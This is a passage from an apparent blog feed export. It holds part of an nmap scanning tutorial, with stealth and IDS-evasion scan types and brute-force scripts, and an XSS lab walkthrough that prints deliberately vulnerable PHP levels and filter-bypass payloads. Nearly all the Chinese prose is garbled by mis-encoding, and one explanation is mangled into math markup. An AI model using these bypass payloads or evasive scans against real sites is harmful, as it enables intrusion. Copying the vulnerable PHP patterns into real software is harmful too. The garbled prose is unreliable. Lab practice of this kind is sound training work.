<p>â€‹	<a href="https://baike.baidu.com/item/UDP/571511">UDP</a> Scan(sU) ç›¸å¯¹äº SYNæ‰«æå’ŒTCPæ‰«æ , UDPæ‰«ææ— éœ€è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹å’Œå‘é€SYNåŒ… , å› ä¸º UDP Scanæ˜¯é’ˆå¯¹UDPç«¯å£æ‰«æçš„,åªéœ€å‘é€UDPæ•°æ®åŒ…åˆ°ç›®æ ‡ , ç„¶åç­‰å¾…å“åº”å³å¯</p>
<p>â€‹	å¦‚æœè¿”å›æ˜¯ICMPçš„é”™è¯¯ä¿¡æ¯ , è¿™è¯´æ˜ç«¯å£æ˜¯å…³é—­çš„ , è‹¥è¿”å›æ˜¯æ­£ç¡®çš„å›åº” , åˆ™è¯´æ˜ç«¯å£æ˜¯å¼€æ”¾çš„ , UDPæ‰«æé€Ÿåº¦ä¼šå¾ˆæ…¢ , æ¯”TCPæ‰«ææ…¢ğŸ˜“</p>
<p>â€‹	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sU.jpg" alt="nmap -sUæ‰«æ" loading="lazy"></p>
<h3 id="-sf-finæ‰«æ">-sF : FINæ‰«æ</h3>
<p>â€‹	FINæ‰«æä¹Ÿæ˜¯TCPçš„ä¸€ç§æ‰«æ , å‘é€ä¸€ä¸ªFINæ ‡å¿—çš„æ•°æ®åŒ… , æœ‰æ—¶å€™ç›®æ ‡ä¸»æœºå¯èƒ½å­˜åœ¨IDSå’ŒIPSç³»ç»Ÿ,ä¼šé˜»æ­¢æ‰SYNæ•°æ®åŒ… , å› æ­¤FINæ ‡å¿—çš„æ•°æ®åŒ…ä¸€èˆ¬ä¸ä¼šé˜»æ­¢ , è€Œä¸”FINæ ‡å¿—çš„æ•°æ®åŒ…ä¹Ÿæ˜¯æ— éœ€è¿›è¡ŒTCPçš„ä¸‰æ¬¡æ¡æ‰‹ , å› æ­¤FINæ‰«æä¹Ÿæ˜¯å¤§æ¦‚ç‡ä¸ä¼šè¢«ç›®æ ‡æŠŠè¿æ¥è®°å…¥ç³»ç»Ÿæ—¥å¿— , æ‰«æçš„ä¿¡æ¯ç›¸å¯¹è¾ƒå°‘</p>
<p>â€‹	<img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sF.jpg" alt="nmap -sFæ‰«æ" loading="lazy"></p>
<h3 id="-sf-sx-sn-åŸç†ç±»ä¼¼">-sF -sX -sN : åŸç†ç±»ä¼¼</h3>
<p>â€‹	åŸç†å¤§è‡´ç›¸åŒ -sF æ˜¯ å‘é€FINæ•°æ®åŒ…æ‰«æ -sX æ˜¯ åœ£è¯æ ‘(XmasTree)æ‰«æ -sNæ˜¯ ç©º(NULL)æ‰«æ</p>
<p>â€‹	æœ‰çš„é˜²ç«å¢™å¯èƒ½ä¼šé˜»æ­¢ -sSæ‰«æ , ä½¿ç”¨è¿™äº›æ‰«æç±»å‹å¯ä»¥ç»•è¿‡é˜»æ­¢è¿›è¡Œæ‰«æ , ä»–ä»¬ä¹Ÿæ˜¯æ²¡æœ‰è¿›è¡ŒTCPä¸‰æ¬¡æ¡æ‰‹ , ç›®æ ‡ä¸»æœºå¤§æ¦‚ç‡ä¸ä¼šè¢«ç›®æ ‡æŠŠè¿æ¥è®°å…¥ç³»ç»Ÿæ—¥å¿—,ä¸”æ‰«æé€Ÿåº¦æ¯” -sT å—</p>
<ul>
<li>ä¼˜ç‚¹ : èƒ½èº²è¿‡ä¸€äº›æ— çŠ¶æ€é˜²ç«å¢™å’ŒæŠ¥æ–‡è¿‡æ»¤è·¯ç”±å™¨ï¼Œæ¯”SYNè¿˜è¦éšç§˜</li>
<li>ç¼ºç‚¹ : ç°ä»£çš„IDSäº§å“å¯ä»¥å‘ç°ï¼Œå¹¶éæ‰€æœ‰çš„ç³»ç»Ÿä¸¥æ ¼éµå¾ª<a href="https://harttle.land/2014/09/27/tcp.html">RFC 793</a></li>
</ul>
<br>
<h2 id="æœåŠ¡ç‰ˆæœ¬è¯†åˆ«">æœåŠ¡ç‰ˆæœ¬è¯†åˆ«</h2>
<h3 id="-sv-versionç‰ˆæœ¬æ‰«ææ£€æµ‹">-sV : Versionç‰ˆæœ¬æ‰«ææ£€æµ‹</h3>
<p>â€‹	Version ç‰ˆæœ¬æ£€æµ‹æ˜¯ç”¨æ¥æ‰«æç›®æ ‡ä¸»æœºä¸Šçš„ç«¯å£æœåŠ¡ç‰ˆæœ¬ , ä¸è¿‡æ­¤æ‰«æé€‰é¡¹ä¸èƒ½ç”¨æ¥æ‰«æç›®æ ‡å¼€æ”¾ç«¯å£ , å› æ­¤ä½¿ç”¨æ­¤é€‰é¡¹ä¹‹å‰ , è¯·ä½¿ç”¨TCPSYNè¿›è¡Œç«¯å£å¼€æ”¾æ‰«æ</p>
<ul>
<li>
<p>--version-intensity &quot;Level&quot; : è®¾ç½®ç‰ˆæœ¬æ‰«æå¼ºåº¦ , LevelèŒƒå›´ä¸º0~9 é»˜è®¤ä¸º7</p>
</li>
<li>
<p>--version-light : è½»é‡çº§æ‰«æ , å³ --version-intensity 2</p>
</li>
<li>
<p>--version-all : é‡åº¦æ‰«æ : å³ --version-intensity 9</p>
</li>
<li>
<p>version-trace : æ˜¾ç¤ºè¯¦ç»†çš„æ‰«æè¿‡ç¨‹ ()</p>
<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sV.jpg" alt="nmap -sVæ‰«æ" loading="lazy"></figure>
</li>
</ul>
<br>
<h2 id="æ“ä½œç³»ç»Ÿè¯†åˆ«">æ“ä½œç³»ç»Ÿè¯†åˆ«</h2>
<h3 id="-o-osæ“ä½œç³»ç»Ÿæ‰«ææ£€æµ‹">-O : OSæ“ä½œç³»ç»Ÿæ‰«ææ£€æµ‹</h3>
<p>OSæ“ä½œç³»ç»Ÿæ‰«ææ£€æµ‹ , å¯ä»¥è¿œç¨‹è½¿è½¦æ“ä½œç³»ç»Ÿä¿¡æ¯ , è¿™äº›ä¿¡æ¯æ˜¯ååˆ†æœ‰ç”¨çš„ , é€šè¿‡è·å–çš„ä¿¡æ¯å¯ä»¥çŸ¥é“å·²çŸ¥çš„æ¼æ´</p>
<ul>
<li>--osscan-guess : çŒœæµ‹åŒ¹é…æ“ä½œç³»ç»Ÿ</li>
<li>--osscan-limit : é’ˆå¯¹æŒ‡å®šçš„ç›®æ ‡è¿›è¡Œç³»ç»Ÿæ£€æµ‹</li>
</ul>
<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-O.jpg" alt="nmap -Oæ‰«æ" loading="lazy"></figure>
<br>
<h2 id="è„šæœ¬æ‰«æ">è„šæœ¬æ‰«æ</h2>
<pre><code class="language-shell">nmap --script å…·ä½“çš„è„šæœ¬ ç›®æ ‡
</code></pre>
<p>nmapå®˜æ–¹è„šæœ¬æ–‡æ¡£ : https://nmap.org/nsedoc/</p>
<p>å·¦ä¾§åˆ—å‡ºäº†è„šæœ¬çš„åˆ†ç±»ï¼Œç‚¹å‡»åˆ†ç±» å¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ªåˆ†ç±»ä¸‹æœ‰å¾ˆå¤šå…·ä½“çš„è„šæœ¬ä¾›æˆ‘ä»¬ä½¿ç”¨ã€‚14å¤§åˆ†ç±»å…·ä½“å¯¹åº”ä¸º</p>
<ul>
<li><a href="https://nmap.org/nsedoc/categories/auth.html">auth</a> : è´Ÿè´£å¤„ç†é‰´æƒè¯ä¹¦çš„è„šæœ¬</li>
<li><a href="https://nmap.org/nsedoc/categories/broadcast.html">broadcast</a> : åœ¨å±€åŸŸç½‘å†…æ¢æŸ¥æ›´å¤šæœåŠ¡å¼€å¯çŠ¶å†µï¼Œå¦‚dhcp/dns/sqlserverç­‰æœåŠ¡</li>
<li><a href="https://nmap.org/nsedoc/categories/brute.html">brute</a> : æä¾›æš´åŠ›ç ´è§£æ–¹å¼ï¼Œé’ˆå¯¹å¸¸è§çš„åº”ç”¨å¦‚http/snmpç­‰</li>
<li><a href="https://nmap.org/nsedoc/categories/default.html">default</a> : ä½¿ç”¨-sCæˆ–-Aé€‰é¡¹æ‰«ææ—¶å€™é»˜è®¤çš„è„šæœ¬ï¼Œæä¾›åŸºæœ¬è„šæœ¬æ‰«æèƒ½åŠ›</li>
<li><a href="https://nmap.org/nsedoc/categories/discovery.html">discovery</a> : å¯¹ç½‘ç»œè¿›è¡Œæ›´å¤šçš„ä¿¡æ¯ï¼Œå¦‚SMBæšä¸¾ã€SNMPæŸ¥è¯¢ç­‰</li>
<li><a href="https://nmap.org/nsedoc/categories/dos.html">dos</a> : ç”¨äºè¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»</li>
<li><a href="https://nmap.org/nsedoc/categories/exploit.html">exploit</a> : åˆ©ç”¨å·²çŸ¥çš„æ¼æ´å…¥ä¾µç³»ç»Ÿ</li>
<li><a href="https://nmap.org/nsedoc/categories/external.html">external</a> : åˆ©ç”¨ç¬¬ä¸‰æ–¹çš„æ•°æ®åº“æˆ–èµ„æºï¼Œä¾‹å¦‚è¿›è¡Œwhoisè§£æ</li>
<li><a href="https://nmap.org/nsedoc/categories/fuzzer.html">fuzzer</a> : æ¨¡ç³Šæµ‹è¯•çš„è„šæœ¬ï¼Œå‘é€å¼‚å¸¸çš„åŒ…åˆ°ç›®æ ‡æœºï¼Œæ¢æµ‹å‡ºæ½œåœ¨æ¼æ´</li>
<li><a href="https://nmap.org/nsedoc/categories/intrusive.html">intrusive</a> : å…¥ä¾µæ€§çš„è„šæœ¬ï¼Œæ­¤ç±»è„šæœ¬å¯èƒ½å¼•å‘å¯¹æ–¹çš„IDS/IPSçš„è®°å½•æˆ–å±è”½</li>
<li><a href="https://nmap.org/nsedoc/categories/malware.html">malware</a> : æ¢æµ‹ç›®æ ‡æœºæ˜¯å¦æ„ŸæŸ“äº†ç—…æ¯’ã€å¼€å¯äº†åé—¨ç­‰ä¿¡æ¯</li>
<li><a href="https://nmap.org/nsedoc/categories/safe.html">safe</a> : æ­¤ç±»ä¸intrusiveç›¸åï¼Œå±äºå®‰å…¨æ€§è„šæœ¬</li>
<li><a href="https://nmap.org/nsedoc/categories/version.html">version</a> : è´Ÿè´£å¢å¼ºæœåŠ¡ä¸ç‰ˆæœ¬æ‰«æï¼ˆVersion Detectionï¼‰åŠŸèƒ½çš„è„šæœ¬</li>
<li><a href="https://nmap.org/nsedoc/categories/vuln.html">vuln</a> : è´Ÿè´£æ£€æŸ¥ç›®æ ‡æœºæ˜¯å¦æœ‰å¸¸è§çš„æ¼æ´ï¼ˆVulnerabilityï¼‰ï¼Œå¦‚æ˜¯å¦æœ‰MS08_067</li>
</ul>
<h3 id="å¯¹sshè¿›è¡Œæš´åŠ›ç ´è§£">å¯¹SSHè¿›è¡Œæš´åŠ›ç ´è§£</h3>
<p>è´¦å·å¯†ç ä¸æ˜¯å¼±å£ä»¤,æ‰€ä»¥ç»“æœæ˜¯è·‘ä¸å‡ºæ¥ğŸ¤£</p>
<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-sC.jpg" alt="nmap -sC-SSH" loading="lazy"></figure>
<br>
<h2 id="æ—¶é—´æ¨¡æ¿">æ—¶é—´æ¨¡æ¿</h2>
<h3 id="-t0-5-è®¾ç½®æ—¶é—´æ¨¡æ¿">-T&lt;0-5&gt; è®¾ç½®æ—¶é—´æ¨¡æ¿</h3>
<pre><code class="language-shell">nmap -sS -T&lt;0-5&gt; 192.168.1.148
</code></pre>
<p>ä¼˜åŒ–æ—¶é—´æ§åˆ¶é€‰é¡¹çš„åŠŸèƒ½å¾ˆå¼ºå¤§ä¹Ÿå¾ˆæœ‰æ•ˆï¼Œä½†æœ‰äº›ç”¨æˆ·ä¼šè¢«è¿·æƒ‘ã€‚æ­¤å¤–ï¼Œ å¾€å¾€é€‰æ‹©åˆé€‚å‚æ•°çš„æ—¶é—´è¶…è¿‡äº†æ‰€éœ€ä¼˜åŒ–çš„æ‰«ææ—¶é—´ã€‚å› æ­¤ï¼ŒNmapæä¾›äº†ä¸€äº›ç®€å•çš„ æ–¹æ³•ï¼Œä½¿ç”¨6ä¸ªæ—¶é—´æ¨¡æ¿ï¼Œä½¿ç”¨æ—¶é‡‡ç”¨-Té€‰é¡¹åŠæ•°å­—(0 - 5) æˆ–åç§°ã€‚æ¨¡æ¿åç§°æœ‰<code>paranoid (0)ã€sneaky (1)ã€polite (2)ã€normal(3)ã€ aggressive (4)å’Œinsane (5)</code></p>
<ul>
<li>paranoidã€sneakyæ¨¡å¼ç”¨äºIDSèº²é¿</li>
<li>Politeæ¨¡å¼é™ä½äº†æ‰«æ é€Ÿåº¦ä»¥ä½¿ç”¨æ›´å°‘çš„å¸¦å®½å’Œç›®æ ‡ä¸»æœºèµ„æºã€‚</li>
<li>Normalä¸ºé»˜è®¤æ¨¡å¼ï¼Œå› æ­¤-T3 å®é™…ä¸Šæ˜¯æœªåšä»»ä½•ä¼˜åŒ–ã€‚</li>
<li>Aggressiveæ¨¡å¼å‡è®¾ç”¨æˆ·å…·æœ‰åˆé€‚åŠå¯é çš„ç½‘ç»œä»è€ŒåŠ é€Ÿ æ‰«æ.</li>
<li>nsaneæ¨¡å¼å‡è®¾ç”¨æˆ·å…·æœ‰ç‰¹åˆ«å¿«çš„ç½‘ç»œæˆ–è€…æ„¿æ„ä¸ºè·å¾—é€Ÿåº¦è€Œç‰ºç‰²å‡†ç¡®æ€§ã€‚</li>
</ul>
<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-T.jpg" alt="nmap -T" loading="lazy"></figure>
<h2 id="å…¶ä»–é€‰é¡¹">å…¶ä»–é€‰é¡¹</h2>
<h3 id="-a-ç»¼åˆæ‰«æ">-A ç»¼åˆæ‰«æ</h3>
<p>æ­¤é€‰é¡¹åŒ…å«äº† 1-10000ç«¯å£pingæ‰«æ , æ“ä½œç³»ç»Ÿæ‰«æ , è„šæœ¬æ‰«æ , è·¯ç”±è¿½è¸ª , æœåŠ¡æ¢æµ‹</p>
<pre><code class="language-shell">nmap -A 192.168.50.148
</code></pre>
<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/nmap/nmap-A.jpg" alt="nmap -A" loading="lazy"></figure>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[XSSå¼¹çª—ç»ƒä¹  : http://test.xss.tv]]></title>
        <id>https://M0kY4n.github.io/Websec/post/testxsstv/</id>
        <link href="https://M0kY4n.github.io/Websec/post/testxsstv/">
        </link>
        <updated>2021-01-07T11:05:33.000Z</updated>
        <content type="html"><![CDATA[<h1 id="xsså¼¹çª—é—¯å…³ç»ƒä¹ ">XSSå¼¹çª—é—¯å…³ç»ƒä¹ </h1>
<br>
<h2 id="å‰è¨€">å‰è¨€</h2>
<p>é¶æœºæºç ä¸ <a href="http://test.xss.tv">http://test.xss.tv</a> çš„é¢˜ç›®æ˜¯ä¸€æ ·çš„,å¹¶ä¸”åˆ é™¤äº†åé¢å‡ é“å·²ç»å¤±æ•ˆçš„Flash XSSé¢˜ç›®,æœ¬æ–‡è¿æ¥æ¥è‡ª<a href="https://www.sqlsec.com/2020/01/xss.html#toc-heading-41">@å›½å…‰</a>åšå®¢ä¸‹ã€ŠXSSä»é›¶å¼€å§‹ã€‹æ–‡ç« çš„è¿æ¥</p>
<blockquote>
<p>é¡¹ç›®åœ°å€: https://github.com/sqlsec/xssgame</p>
</blockquote>
<br>
<br>
<h2 id="0x00-å…ˆçƒ­ä¸ªèº«å§">0x00 å…ˆçƒ­ä¸ªèº«å§</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;name&quot;];
echo &quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·:&quot;.$str.&quot;&lt;/h2&gt;&quot;;
?&gt;
</code></pre>
<p>æ²¡æœ‰å¯¹$strè¿›è¡Œä»»ä½•è¿‡æ»¤,echo ç›´æ¥æ‰§è¡Œäº†JSä»£ç </p>
<pre><code class="language-html">payload:
?name=&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<br>
<br>
<h2 id="0x01-çª’æ¯çš„æ“ä½œ">0x01 çª’æ¯çš„æ“ä½œ</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level2.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str.'&quot;&gt;
&lt;input type=submit name=submit value=&quot;æœç´¢&quot;/&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<p>åŒå¼•å·é—­åˆæ–‡æœ¬æ¡†çš„value,æ’å…¥JSä»£ç </p>
<pre><code class="language-html">payload:
&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;
</code></pre>
<br>
<br>
<h2 id="0x02-è¿™è¯¥å’‹åŠå•Š">0x02 è¿™è¯¥å’‹åŠå•Š</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
&lt;form action=level3.php method=GET&gt;
&lt;input name=keyword  value='&quot;.htmlspecialchars($str).&quot;'&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;&quot;;
?&gt;
</code></pre>
<p>å•å¼•å·å¼•å·é—­åˆæ–‡æœ¬æ¡†çš„value,æ’å…¥JS DOMäº‹ä»¶ä»£ç </p>
<pre><code class="language-html">payload:
' onclick=alert(1) //
</code></pre>
<br>
<br>
<h2 id="0x03-ç”Ÿæ— å¯æ‹">0x03 ç”Ÿæ— å¯æ‹</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level4.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<p>æœ¬é¢˜å¯¹$strè¿›è¡Œäº†å­—ç¬¦ä¸²è¿‡æ»¤.å°†'&lt;' , '&gt;'æ›¿æ¢æˆç©ºæ ¼,ä»ç„¶ä½¿ç”¨0x02çš„payload ,åªä¸è¿‡è¿™é¢˜æ˜¯å°†åŒå¼•å·è¿›è¡Œé—­åˆ,å†æ’å…¥ JS DOMäº‹ä»¶ä»£ç </p>
<pre><code class="language-html">payload:
&quot; onclick=alert(1) //
</code></pre>
<br>
<br>
<h2 id="0x04-æ²¡é”™åˆæ˜¯æœç´¢">0x04 æ²¡é”™åˆæ˜¯æœç´¢</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level5.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<p>æœ¬é¢˜å¯¹$strå…ˆè¿›è¡Œè½¬æ¢å°å†™,ç„¶åå°†&quot;&lt;script&quot;æ›¿æ¢æˆ&quot;&lt;scr_ipt&quot; , &quot;on&quot;æ›¿æ¢æˆ&quot;o_n&quot;,æ€è·¯æ˜¯å°†åŒå¼•å·å’Œæ‹¬å·é—­åˆ,æ’å…¥è¶…é“¾æ¥aæ ‡ç­¾,åˆ©ç”¨hrefå±æ€§æ‰§è¡Œ JSä»£ç </p>
<pre><code class="language-html">payloda:
&quot;&gt; &lt;a href=javascript:alert(1)&gt; //
</code></pre>
<br>
<br>
<h2 id="0x05-å—¯-è¿˜æ˜¯æœç´¢">0x05 å—¯ è¿˜æ˜¯æœç´¢</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = $_GET[&quot;keyword&quot;];
$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level6.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<p>æœ¬é¢˜è¿›è¡Œè¯¸å¤šè¿‡æ»¤,ä½†æ˜¯æ²¡æœ‰è¿›è¡Œå¤§å°å†™é™åˆ¶,æ‰€ä»¥ä½¿ç”¨å¤§å†™0x04çš„payloadè¿›è¡Œç»•è¿‡</p>
<pre><code class="language-html">payloda:
&quot;&gt; &lt;a Href=javascript:alert(1)&gt; //
</code></pre>
<br>
<br>
<h2 id="0x06-çŒœä¸€çŒœä¸‹é¢é¢˜ç›®è¿˜æœ‰æœç´¢å˜›">0x06 çŒœä¸€çŒœä¸‹é¢é¢˜ç›®è¿˜æœ‰æœç´¢å˜›</h2>
<pre><code class="language-php">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str =strtolower( $_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
echo &quot;&lt;h2 align=center&gt;æ²¡æœ‰æ‰¾åˆ°å’Œ&quot;.htmlspecialchars($str).&quot;ç›¸å…³çš„ç»“æœ.&lt;/h2&gt;&quot;.'&lt;center&gt;
&lt;form action=level7.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
&lt;input type=submit name=submit value=æœç´¢ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
</code></pre>
<p>æœ¬é¢˜ç›¸å¯¹äºç¬¬å…­é¢˜,è¿‡æ»¤æ›¿æ¢æˆç©º,å†™è¿›è¡Œäº†å¤§å°å†™é™åˆ¶,ä½†æ˜¯ç¨‹åºåªæ˜¯è¿è¡Œä¸€æ¬¡,æ‰€ä»¥å¯ä»¥å°†æ ‡ç­¾åŒå†™è¿›è¡Œç»•è¿‡</p>
<pre><code class="language-html">payload:
&quot;&gt; &lt;scrSCRIPTipt&gt;alert(1)&lt;/scrSCRIPTipt&gt;
</code></pre>
<br>
<br>
<h2 id="0x07-è€é“è¦å’Œæˆ‘æ¢å‹é“¾å˜›">0X07 è€é“è¦å’Œæˆ‘æ¢å‹é“¾å˜›ï¼Ÿ</h2>
<pre><code class="language-php+HTML">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
$str7=str_replace('&quot;','&amp;quot',$str6);
echo '&lt;center&gt;
&lt;form action=level8.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
&lt;?php
 echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;';
?&gt;
</code></pre>
<p>æœ¬é¢˜å¯¹<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>t</mi><mi>r</mi><mi mathvariant="normal">è¿›</mi><mi mathvariant="normal">è¡Œ</mi><mi mathvariant="normal">äº†</mi><mi mathvariant="normal">å°</mi><mi mathvariant="normal">å†™</mi><mi mathvariant="normal">é™</mi><mi mathvariant="normal">åˆ¶</mi><mi mathvariant="normal">å’Œ</mi><mi mathvariant="normal">è¿‡</mi><mi mathvariant="normal">æ»¤</mi><mo separator="true">,</mo><mi mathvariant="normal">ä½†</mi><mi mathvariant="normal">æ˜¯</mi><mi mathvariant="normal">ç»</mi><mi mathvariant="normal">è¿‡</mi><mi mathvariant="normal">è¿‡</mi><mi mathvariant="normal">æ»¤</mi><mi mathvariant="normal">å</mi><mi mathvariant="normal">çš„</mi></mrow><annotation encoding="application/x-tex">strè¿›è¡Œäº†å°å†™é™åˆ¶å’Œè¿‡æ»¤,ä½†æ˜¯ç»è¿‡è¿‡æ»¤åçš„</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.80952em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord cjk_fallback">è¿›</span><span class="mord cjk_fallback">è¡Œ</span><span class="mord cjk_fallback">äº†</span><span class="mord cjk_fallback">å°</span><span class="mord cjk_fallback">å†™</span><span class="mord cjk_fallback">é™</span><span class="mord cjk_fallback">åˆ¶</span><span class="mord cjk_fallback">å’Œ</span><span class="mord cjk_fallback">è¿‡</span><span class="mord cjk_fallback">æ»¤</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">ä½†</span><span class="mord cjk_fallback">æ˜¯</span><span class="mord cjk_fallback">ç»</span><span class="mord cjk_fallback">è¿‡</span><span class="mord cjk_fallback">è¿‡</span><span class="mord cjk_fallback">æ»¤</span><span class="mord cjk_fallback">å</span><span class="mord cjk_fallback">çš„</span></span></span></span>str7ä½¿ç”¨åœ¨ aæ ‡ç­¾çš„hrefå±æ€§ä¸Šé¢,hrefå±æ€§å¯ä»¥ä½¿ç”¨JavaScriptåè®®æ¥æ‰§è¡ŒJSä»£ç </p>
<pre><code class="language-html">payload:
JavaScrip&amp;#x74;:alert(1)

å› ä¸º&quot;script&quot;ä¼šè¢«è¿‡æ»¤æ›¿æ¢æˆ&quot;scr_ipt&quot;,æ‰€ä»¥å°†å­—æ¯è¿›è¡Œç¼–ç HTMLå®ä½“,HTMLå®ä½“åœ¨æµè§ˆå™¨è§£ææ—¶ä¼šè¿›è¡Œè§£ç è¿˜åŸå­—ç¬¦
</code></pre>
<br>
<br>
<h2 id="0x08-æ·»åŠ å‹è¿again">0x08 æ·»åŠ å‹è¿again</h2>
<pre><code class="language-php+HTML">&lt;?php
ini_set(&quot;display_errors&quot;, 0);
$str = strtolower($_GET[&quot;keyword&quot;]);
$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
$str7=str_replace('&quot;','&amp;quot',$str6);
echo '&lt;center&gt;
&lt;form action=level9.php method=GET&gt;
&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
&lt;input type=submit name=submit value=æ·»åŠ å‹æƒ…é“¾æ¥ /&gt;
&lt;/form&gt;
&lt;/center&gt;';
?&gt;
&lt;?php
if(false===strpos($str7,'http://'))
{
  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;æ‚¨çš„é“¾æ¥ä¸åˆæ³•ï¼Ÿæœ‰æ²¡æœ‰ï¼&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;';
        }
else
{
  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;å‹æƒ…é“¾æ¥&lt;/a&gt;&lt;/center&gt;';
}
?&gt;
